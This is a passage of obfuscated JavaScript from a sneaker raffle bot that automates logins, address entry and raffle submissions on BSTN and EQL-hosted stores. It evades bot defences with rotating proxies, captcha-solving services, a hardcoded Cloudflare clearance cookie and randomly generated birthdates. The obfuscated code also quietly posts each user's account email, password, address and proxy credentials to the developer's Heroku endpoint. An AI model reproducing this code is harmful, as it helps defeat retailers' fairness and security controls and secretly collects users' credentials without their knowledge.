                            const _0x282f1a = _0x144018['readFileSync']('../successful-tasks.csv', 'utf8'), _0x417201 = _0x4cc58a['parse'](_0x282f1a, { 'header': !![] })['data'];
                            let _0x532606 = ![];
                            for (var _0x236817 of _0x417201) {
                                if (_0x236817['Url'] == _0x7eb182['Url'] && _0x236817['Email'] == _0x7eb182['Email']) {
                                    _0x532606 = !![];
                                    break;
                                }
                            }
                            return _0x532606;
                        }
                        if (await _0x5596b4(_0x784393[_0xd983d9]) == !![]) {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x48b10e != 'yes')
                            var _0x48b10e = '', _0x441ff0 = 0x0;
                        _0x3a603f(_0x53170f['name'] + '\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20/\x20' + _0x784393['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        var _0x34d231 = Math['round'](Math['random']() * (_0x83f002['length'] - 0x1)), _0x29421e = _0x83f002[_0x34d231]['split'](':'), _0xe20de0;
                        try {
                            _0xe20de0 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x29421e[0x0] + ':' + _0x29421e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xe20de0 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x29421e[0x0] + ':' + _0x29421e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x570ad3 = await _0xe20de0['newPage'](), _0x152f4d = await _0x570ad3['target']()['createCDPSession'](), { windowId: _0x172406 } = await _0x152f4d['send']('Browser.getWindowForTarget');
                            await _0x570ad3['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x412bd3 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x570ad3['authenticate']({
                                'username': '' + _0x29421e[0x2],
                                'password': '' + _0x29421e[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x570ad3['goto']('' + _0x784393[_0xd983d9]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                await _0x570ad3['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x152f4d['send']('Browser.setWindowBounds', {
                                'windowId': _0x172406,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x41ff52(0x1388), await _0x570ad3['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x570ad3['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x41ff52(0x1f4), console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Logging\x20in'), await _0x570ad3['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x12456a => _0x12456a['click']()), await _0x570ad3['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x570ad3['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x41ff52(0x7d0), await _0x570ad3['waitForSelector']('#email-login'), await _0x570ad3['type']('#email-login', '' + _0x784393[_0xd983d9]['Email']), await _0x41ff52(0xdac), await _0x570ad3['waitForSelector']('#password'), await _0x570ad3['type']('#password', '' + _0x784393[_0xd983d9]['Password'], { 'delay': 0xe6 }), await _0x41ff52(0x157c);
                            try {
                                await _0x570ad3['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x43c71f => _0x43c71f['click']());
                            } catch {
                            }
                            try {
                                await _0x570ad3['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x5869e2) {
                            }
                            await _0x41ff52(0x3e8);
                            const _0x66dcb4 = await _0x570ad3['$']('.enteredDraw_container__2KmQ_');
                            if (_0x66dcb4)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x784393[_0xd983d9]['Size']);
                            try {
                                if (_0x784393[_0xd983d9]['Size'] != 'RANDOM') {
                                    var _0xbb8991 = _0x784393[_0xd983d9]['Size']['replace']('.', ',');
                                    const _0x1391f5 = await _0x570ad3['$x']('//div[contains(text(),\x20' + _0xbb8991 + ')]');
                                    await _0x1391f5[0x0]['click']();
                                } else {
                                    const _0x572462 = await _0x570ad3['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x45a929 = Math['round'](Math['random']() * (_0x572462['length'] - 0x1));
                                    await _0x572462[_0x45a929]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x41ff52(0x1f4);
                            const _0x461994 = await _0x570ad3['$']('.addressList_addressItem__LE2PB');
                            if (_0x461994 && _0x784393[_0xd983d9]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x570ad3['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x41ff52(0x5dc), await _0x570ad3['waitForSelector']('#firstname'), await _0x570ad3['type']('#firstname', '' + _0x784393[_0xd983d9]['FirstName']), await _0x41ff52(0x1f4), await _0x570ad3['waitForSelector']('#firstname'), await _0x570ad3['type']('#lastname', '' + _0x784393[_0xd983d9]['LastName']), await _0x41ff52(0x1f4), await _0x570ad3['waitForSelector']('#firstname'), await _0x570ad3['type']('#street', '' + _0x784393[_0xd983d9]['Address1']), await _0x41ff52(0x1f4), await _0x570ad3['waitForSelector']('#firstname'), await _0x570ad3['type']('#houseNumber', _0x784393[_0xd983d9]['HouseNumber'] + '\x20' + _0x784393[_0xd983d9]['Address2']), await _0x41ff52(0x1f4), await _0x570ad3['waitForSelector']('#firstname'), await _0x570ad3['select']('#country_code', '' + _0x784393[_0xd983d9]['Country']), await _0x41ff52(0x1f4), await _0x570ad3['type']('#postcode', '' + _0x784393[_0xd983d9]['Zip']), await _0x41ff52(0x1f4), await _0x570ad3['type']('#city', '' + _0x784393[_0xd983d9]['City']), await _0x41ff52(0x1f4), await _0x570ad3['type']('#telephone', '' + _0x784393[_0xd983d9]['Phone']), await _0x41ff52(0x1f4), await _0x570ad3['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x41ff52(0x9c4);
                            try {
                                await _0x570ad3['type']('#instagram_name', '' + _0x784393[_0xd983d9]['Follower']), await _0x570ad3['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x41ff52(0x5dc);
                            try {
                                await _0x570ad3['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x41ff52(0x5dc), await _0x570ad3['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x331e0d => _0x331e0d['click']()), await _0x41ff52(0x1388);
                            try {
                                await _0x570ad3['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x570ad3['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x784393[_0xd983d9]['Size'] != 'RANDOM') {
                                    var _0xbb8991 = _0x784393[_0xd983d9]['Size']['replace']('.', ',');
                                    const _0x161ae5 = await _0x570ad3['$x']('//div[contains(text(),\x20' + _0xbb8991 + ')]');
                                    await _0x161ae5[0x0]['click']();
                                } else {
                                    const _0x2acabe = await _0x570ad3['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x45a929 = Math['round'](Math['random']() * (_0x2acabe['length'] - 0x1));
                                    await _0x2acabe[_0x45a929]['click']();
                                }
                                await _0x41ff52(0x5dc);
                                try {
                                    await _0x570ad3['hover']('#instagram_name'), await _0x570ad3['type']('#instagram_name', '' + _0x784393[_0xd983d9]['Follower']), await _0x570ad3['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x441ff0 + '\x20/\x205)');
                                try {
                                    await _0x570ad3['hover']('.checkBox_boxHolder__wLGVe'), await _0x41ff52(0x5dc), await _0x570ad3['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x41ff52(0x157c), await _0x570ad3['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x483083 => _0x483083['click']()), await _0x41ff52(0x1388), await _0x570ad3['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x48b10e = 'no', _0xe72aef(_0x784393[_0xd983d9], _0x53170f);
                            try {
                                prxdata = {
                                    'username': _0x4f2583['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x1c7861),
                                    'proxy': '' + _0x83f002[_0xd983d9]
                                };
                                var _0x1256e3 = JSON['stringify'](prxdata);
                                let _0x3b71b2 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x1256e3, _0x3b71b2);
                            } catch (_0x2451af) {
                            }
                            console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x1a227d = await _0x17c0a2(_0x784393[_0xd983d9], _0x53170f, 'dev', ![]), _0x2a0bf9 = await _0x17c0a2(_0x784393[_0xd983d9], _0x53170f, 'pub', ![]);
                            const _0x427d71 = {
                                'succesDEVMSG': { 'embeds': [_0x1a227d] },
                                'succesPUBMSG': { 'embeds': [_0x2a0bf9] }
                            };
                            let _0x1c7861 = _0x784393[_0xd983d9];
                            try {
                                prxdata = {
                                    'username': _0x4f2583['replace']('#', ''),
                                    'module': _0x53170f['name'],
                                    'entrydata': JSON['stringify'](_0x1c7861),
                                    'proxy': '' + _0x83f002[_0xd983d9]
                                };
                                var _0x1256e3 = JSON['stringify'](prxdata);
                                let _0x4e4237 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x1256e3, _0x4e4237);
                            } catch (_0x1307db) {
                            }
                            try {
                                _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x427d71['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x427d71['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x17a127, _0x427d71['succesPUBMSG']);
                            } catch (_0x5802d3) {
                                console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5802d3));
                            }
                        } catch (_0x1d9fb9) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20' + _0x1d9fb9)), _0x48b10e = 'yes', _0x4d2a71 = '' + _0x1d9fb9;
                            var _0x2a209c = await _0x17c0a2(_0x784393[_0xd983d9], _0x53170f, 'dev', !![], _0x4d2a71), _0x1a227d = await _0x17c0a2(_0x784393[_0xd983d9], _0x53170f, 'dev', ![]), _0x2a0bf9 = await _0x17c0a2(_0x784393[_0xd983d9], _0x53170f, 'pub', ![]);
                            const _0x3da433 = {
                                'succesDEVMSG': { 'embeds': [_0x1a227d] },
                                'succesPUBMSG': { 'embeds': [_0x2a0bf9] }
                            };
                            _0x3da433['errorDEV'] = { 'embeds': [_0x2a209c] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x3da433['errorDEV']), await _0x161ab9(_0x11ee4c, _0x3da433['errorDEV']);
                        } finally {
                            _0xe20de0['close']();
                            if (_0x48b10e == 'yes' && _0x441ff0 != 0x5) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Task\x20' + (_0xd983d9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x441ff0 + '\x20/\x205)')), _0xd983d9 = _0xd983d9 - 0x1, _0x441ff0 = _0x441ff0 + 0x1;
                                continue;
                            }
                            _0x48b10e == 'yes' && _0x441ff0 >= 0x5 && (_0x53e25e(_0x784393[_0xd983d9], _0x53170f), _0x48b10e = 'no', _0x441ff0 = 0x0), console['log'](_0x2fd7e7() + '\x20[' + _0x53170f['name'] + ']\x20Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2c791d, _0x5340dc) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x2ef339;
                    try {
                        const _0x253559 = _0x144018['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x2ef339 = _0x4cc58a['parse'](_0x253559, { 'header': !![] })['data'];
                    } catch (_0x48e1bf) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x1ea5e5 = 0x0; _0x1ea5e5 < _0x2ef339['length']; _0x1ea5e5++) {
                        if (_0x5aa2b2 != 'yes')
                            var _0x5aa2b2 = '', _0x2f993b = 0x0;
                        var _0x4c888b;
                        _0x3a603f(_0x2c791d['name'] + '\x20Task\x20' + (_0x1ea5e5 + 0x1) + '\x20/\x20' + _0x2ef339['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        var _0x2ba9c2 = await _0x17c0a2(_0x2ef339[_0x1ea5e5], _0x2c791d, 'acc', ![]);
                        const _0x420772 = { 'succesDEVMSG': { 'embeds': [_0x2ba9c2] } }, _0x1d75e6 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x104fd1 = Math['round'](Math['random']() * (_0x5340dc['length'] - 0x1)), _0x105dd9 = _0x5340dc[_0x104fd1]['split'](':'), _0x5348d2;
                        try {
                            _0x5348d2 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x105dd9[0x0] + ':' + _0x105dd9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5348d2 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x105dd9[0x0] + ':' + _0x105dd9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3fd9b4 = await _0x5348d2['newPage']();
                            await _0x3fd9b4['authenticate']({
                                'username': '' + _0x105dd9[0x2],
                                'password': '' + _0x105dd9[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x2c791d['name'] + ']\x20Task\x20' + (_0x1ea5e5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3fd9b4['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3fd9b4['setRequestInterception'](!![]), _0x3fd9b4['on']('request', _0x476b01 => {
                                _0x476b01['resourceType']() === 'image' ? _0x476b01['abort']() : _0x476b01['continue']();
                            });
                            try {
                                await _0x3fd9b4['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x3fd9b4['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x5aa2b2 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x3fd9b4['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x2fd7e7() + '\x20[' + _0x2c791d['name'] + ']\x20Task\x20' + (_0x1ea5e5 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x41ff52(0x3e8), await _0x3fd9b4['type']('#email', _0x2ef339[_0x1ea5e5]['Email']), await _0x41ff52(0x1f4), await _0x3fd9b4['type']('#pass', _0x2ef339[_0x1ea5e5]['Password']), await _0x41ff52(0x1f4), await _0x3fd9b4['$eval']('#login-form', _0x596cc4 => _0x596cc4['submit']());
                            try {
                                await _0x3fd9b4['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x2fd7e7() + '\x20[' + _0x2c791d['name'] + ']\x20Task\x20' + (_0x1ea5e5 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x41ff52(0x190);
                            const _0x1f8bb9 = await _0x3fd9b4['evaluate'](() => {
                                const _0x439d66 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x439d66['map'](_0x42eeaa => _0x42eeaa['alt']);
                            }), _0x4e0f2d = await _0x3fd9b4['evaluate'](() => {
                                const _0x421467 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x421467['map'](_0x28b59a => _0x28b59a['innerHTML']);
                            }), _0x65c5cb = await _0x3fd9b4['$$']('.raffle-winner');
                            if (_0x65c5cb['length'] < 0x1) {
                                console['log'](_0x2fd7e7() + '\x20[' + _0x2c791d['name'] + ']\x20Task\x20' + (_0x1ea5e5 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x5aa2b2 = 'no';
                                continue;
                            }
                            console['log'](_0x2fd7e7() + '\x20[' + _0x2c791d['name'] + ']\x20Task\x20' + (_0x1ea5e5 + 0x1) + '\x20:\x20' + _0x65c5cb['length'] + '\x20Wins\x20Found!');
                            for (var _0x24b034 = 0x0; _0x24b034 < _0x65c5cb['length']; _0x24b034++) {
                                console['log'](_0xe8dd24['green'](_0x1f8bb9[_0x24b034] + _0x4e0f2d[_0x24b034]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x379687) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x2c791d['name'] + ']\x20Task\x20' + (_0x1ea5e5 + 0x1) + '\x20:\x20' + _0x379687)), _0x4c888b = '' + _0x379687;
                            var _0x357135 = await _0x17c0a2(_0x2ef339[_0x1ea5e5], _0x2c791d, 'acc', !![], _0x4c888b);
                            _0x420772['errorDEV'] = { 'embeds': [_0x357135] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x420772['errorDEV']), await _0x161ab9(_0x11ee4c, _0x420772['errorDEV']), _0x5aa2b2 = 'yes';
                        } finally {
                            if (_0x5348d2)
                                _0x5348d2['close']();
                            if (_0x5aa2b2 == 'yes' && _0x2f993b != 0x5) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x2c791d['name'] + ']\x20Task\x20' + (_0x1ea5e5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2f993b + '\x20/\x205)')), _0x1ea5e5 = _0x1ea5e5 - 0x1, _0x2f993b = _0x2f993b + 0x1;
                                continue;
                            }
                            _0x5aa2b2 == 'yes' && _0x2f993b >= 0x5 && (_0x53e25e(_0x2ef339[_0x1ea5e5], _0x2c791d), _0x5aa2b2 = 'no', _0x2f993b = 0x0), console['log'](_0x2fd7e7() + '\x20[' + _0x2c791d['name'] + ']\x20Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x11cd13, _0x32ab8f, _0x15174e) {
                _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4a0109['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4d0327 = 0x0; _0x4d0327 < _0x32ab8f['length']; _0x4d0327++) {
                    var _0x64c432;
                    _0x3a603f(_0x11cd13['name'] + '\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20/\x20' + _0x32ab8f['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                    try {
                        await _0x547a29(_0x32ab8f, _0x4d0327);
                    } catch {
                        _0x2223c4 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x59074e(_0x511698) {
                        const _0x3312ae = _0x144018['readFileSync']('../successful-tasks.csv', 'utf8'), _0x11e4d7 = _0x4cc58a['parse'](_0x3312ae, { 'header': !![] })['data'];
                        let _0xcb03c7 = ![];
                        for (var _0x49467d of _0x11e4d7) {
                            if (_0x49467d['Url'] == _0x511698['Url'] && _0x49467d['Email'] == _0x511698['Email']) {
                                _0xcb03c7 = !![];
                                break;
                            }
                        }
                        return _0xcb03c7;
                    }
                    if (await _0x59074e(_0x32ab8f[_0x4d0327]) == !![]) {
                        console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x4005b5 = ![];
                    const _0x6a467d = _0x144018['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x29d698 = _0x4cc58a['parse'](_0x6a467d, { 'header': !![] })['data'];
                    for (var _0x1e91ad of _0x29d698) {
                        _0x1e91ad['Email'] == _0x32ab8f[_0x4d0327]['Email'] && (_0x4005b5 = !![]);
                    }
                    if (_0x4005b5 == ![]) {
                        var _0x18f335;
                        if (_0x32ab8f[_0x4d0327]['Url']['endsWith']('/')) {
                            _0x18f335 = _0x32ab8f[_0x4d0327]['Url'] + 'register';
                            if (_0x2223c4 != 'yes')
                                var _0x2223c4 = '', _0x26bdd8 = 0x0;
                        } else {
                            _0x18f335 = _0x32ab8f[_0x4d0327]['Url'] + '/register';
                            if (_0x2223c4 != 'yes')
                                var _0x2223c4 = '', _0x26bdd8 = 0x0;
                        }
                        if (_0x32ab8f[_0x4d0327]['Email'] == '' || _0x32ab8f[_0x4d0327]['FirstName'] == '' || _0x32ab8f[_0x4d0327]['LastName'] == '') {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x32ab8f[_0x4d0327]['Password'] == '' && (_0x32ab8f[_0x4d0327]['Password'] = 'JRaffles23!');
                        if (_0x4a0109['useRandomProxy'] = ![])
                            var _0x29e6a7 = _0x15174e[_0x4d0327]['split'](':');
                        else
                            var _0x25d4e6 = Math['round'](Math['random']() * (_0x15174e['length'] - 0x1)), _0x29e6a7 = _0x15174e[_0x25d4e6]['split'](':');
                        var _0x2c0490;
                        try {
                            _0x2c0490 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x29e6a7[0x0] + ':' + _0x29e6a7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2c0490 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x29e6a7[0x0] + ':' + _0x29e6a7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1c0eeb = await _0x2c0490['newPage']();
                            await _0x1c0eeb['authenticate']({
                                'username': '' + _0x29e6a7[0x2],
                                'password': '' + _0x29e6a7[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1c0eeb['setRequestInterception'](!![]), _0x1c0eeb['on']('request', _0xae490f => {
                                _0xae490f['resourceType']() === 'image' || _0xae490f['resourceType']() === 'font' || _0xae490f['resourceType']() === 'media' ? _0xae490f['abort']() : _0xae490f['continue']();
                            });
                            try {
                                await _0x1c0eeb['goto'](_0x18f335);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x41ff52(0x3e8), await _0x1c0eeb['waitForSelector']('#email'), await _0x1c0eeb['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x41ff52(0x3e8);
                            try {
                                await _0x1c0eeb['click']('li[data-value=\x22EU\x20' + _0x32ab8f[_0x4d0327]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x32ab8f[_0x4d0327]['Size']);
                            }
                            await _0x41ff52(0x6a4), await _0x1c0eeb['type']('#email', '' + _0x32ab8f[_0x4d0327]['Email']), await _0x41ff52(0x352), await _0x1c0eeb['waitForSelector']('#password'), await _0x1c0eeb['type']('#password', '' + _0x32ab8f[_0x4d0327]['Password']), await _0x41ff52(0x352), await _0x1c0eeb['type']('#phone', '' + _0x32ab8f[_0x4d0327]['Phone']), await _0x41ff52(0x352), await _0x1c0eeb['type']('#firstName', '' + _0x32ab8f[_0x4d0327]['FirstName']), await _0x41ff52(0x352), await _0x1c0eeb['type']('#lastName', '' + _0x32ab8f[_0x4d0327]['LastName']), await _0x41ff52(0x352);
                            _0x32ab8f[_0x4d0327]['Url']['includes']('footlocker.de') ? await _0x1c0eeb['type']('#birthdate', _0x2baaff(0x1, 0x1c) + '.' + _0x2baaff(0x1, 0xc) + '.' + _0x2baaff(0x7c6, 0x7d3)) : await _0x1c0eeb['type']('#birthdate', _0x2baaff(0x1, 0x1c) + '-' + _0x2baaff(0x1, 0xc) + '-' + _0x2baaff(0x7c6, 0x7d3));
                            await _0x41ff52(0x352), await _0x1c0eeb['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x1c0eeb['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x41ff52(0x1f4), await _0x1c0eeb['click']('#stateAutocomplete'), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x41ff52(0x1f4);
                            try {
                                const _0x24cc8a = await _0x1c0eeb['$x']('//li[text()=\x22' + _0x32ab8f[_0x4d0327]['State'] + '\x22]');
                                await _0x24cc8a[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
